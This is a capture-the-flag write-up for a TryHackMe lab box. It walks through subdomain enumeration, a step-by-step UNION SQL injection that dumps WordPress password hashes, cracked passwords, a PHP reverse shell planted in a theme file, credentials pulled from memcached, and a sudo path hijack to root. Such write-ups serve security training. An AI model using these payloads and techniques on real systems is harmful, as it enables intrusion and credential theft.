# 74 - -Wekor (MySQLI, Wordpress, memcached, exploiting Directory permissions to get root)

Room Link --> [https://tryhackme.com/room/wekorra](https://tryhackme.com/room/wekorra)

Just a quick note, Please use the domain : `wekor.thm` as it could be useful later on in the box.

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.38.87 -p- -sV

port 80 and 22
```
{% endcode %}

Navigating to `/robots.txt` .

```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

Navigating to \`[http://wekor.thm/comingreallysoon/](http://wekor.thm/comingreallysoon/)\`

{% code overflow="wrap" %}
```
Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 
```
{% endcode %}

#### Subdomain / vhost enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://wekor.thm -H "Host: FUZZ.wekor.thm" -fs 23

site
```
{% endcode %}

`http://site.wekor.thm` .

{% code overflow="wrap" %}
```
Hi there!

Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS!

- Jim
```
{% endcode %}

#### Gobuster enum on the new subdomain

{% code overflow="wrap" lineNumbers="true" %}
```
gobuster dir -u http://site.wekor.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error

/wordpress
```
{% endcode %}

So back to `/it_next` .

### SQLI&#x20;

On the [http://wekor.thm/it-next/it\_cart.php](http://wekor.thm/it-next/it\_cart.php) page.

<figure><img src=".gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

Putting a `'` in the Coupon code field, i got this error.

<figure><img src=".gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

### Number of Columns

`' UNION SELECT NULL,NULL,NULL,NULL-- -` - obviously there are less than 4 columns.

<figure><img src=".gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

We get normal response with 3 NULLs, meaning 3 columns.

<figure><img src=".gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

We can see the MySQL version.

`' UNION SELECT @@version,NULL,NULL-- -`&#x20;

<figure><img src=".gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

### DBs /Schema Names&#x20;

{% code overflow="wrap" %}
```sql
' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),NULL,NULL FROM information_schema.SCHEMATA-- -

# information_schema,coupons,mysql,performance_schema,sys,wordpress
```
{% endcode %}

### Tables

{% code overflow="wrap" %}
```sql
# for "wordpress" DB.
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema="wordpress"-- -

# wp_commentmeta,wp_comments,wp_links,wp_options,wp_postmeta,wp_posts,wp_term_relationships,wp_term_taxonomy,wp_termmeta,wp_terms,wp_usermeta,wp_users
```
{% endcode %}

### Columns

{% code overflow="wrap" %}
```sql
# for "wp_users" Table.
' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name="wp_users"-- -

# ID,user_login,user_pass,user_nicename,user_email,user_url,user_registered,user_activation_key,user_status,display_name
```
{% endcode %}

### Dump Data

{% code overflow="wrap" %}
```sql
' UNION SELECT GROUP_CONCAT(user_login,"|--|",user_pass),NULL,NULL FROM wordpress.wp_users-- -

admin|--|$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.
wp_jeffrey|--|$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10
wp_yura|--|$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/
wp_eagle|--|$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/
```
{% endcode %}

We were able to dump user credentials. They are probably for the `http://site.wekor.thm/wordpress/wp-admin` site.

Time to crack them with John.

{% code overflow="wrap" %}
```bash
john passw --wordlist=/usr/share/wordlists/rockyou.txt

rockyou          (wp_jeffrey)     
xxxxxx           (wp_eagle)     
soccer13         (wp_yura)
```
{% endcode %}

I went to the usual `wp-admin.php` login page and tried the login with `wp_jeffrey` at first. But the dashboard didn’t reveal a lot. Then I logged in with `wp_yura` and I got an admin dashboard with all the important functionalities.

### Initial Access

SO i edited the 404.php file for the twentytwentyone theme and put php reverse shell then navigated to [http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php](http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php) to execute it, and got a shell.

<figure><img src=".gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

The hint said to check what ports are open.

`ss -tulnp` .

<figure><img src=".gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

Here I checked the TCP ports with 127.0.0.1 set to them and the only conspicuous one was 11211. On [SpeedGuide](https://www.speedguide.net/port.php?port=11211) I found some useful informations about this specific port and then simply searched for “memchache” on the filesystem.

```bash
find / -type f -name "memcache" 2>/dev/null
```

With this I got some locations for it.

<figure><img src="https://marcorei7.files.wordpress.com/2021/03/find-command.png?w=445" alt="Memcache" height="290" width="445"><figcaption></figcaption></figure>

```bash
./memcached-tool localhost:11211 dump

# we got Okra creds.
orka : OrkAiSC00L24/7$
```

<figure><img src=".gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to root

`sudo -l` .

There is a binary we can execute as root user.

Then I noticed the permissions set for the directory those files were in. I went up to the home directory of “Orka” and moved the Desktop away. I created my own Desktop folder and copied a bash shell into it with the name “bitcoin”. Now I should be able to execute the bash shell with sudo rights.

```bash
cd /home/Orka
mv Desktop oldDesktop
mkdir Desktop
cd Desktop
cp /bin/bash ./bitcoin
sudo /home/Orka/Desktop/bitcoin
```

<figure><img src=".gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

Done!

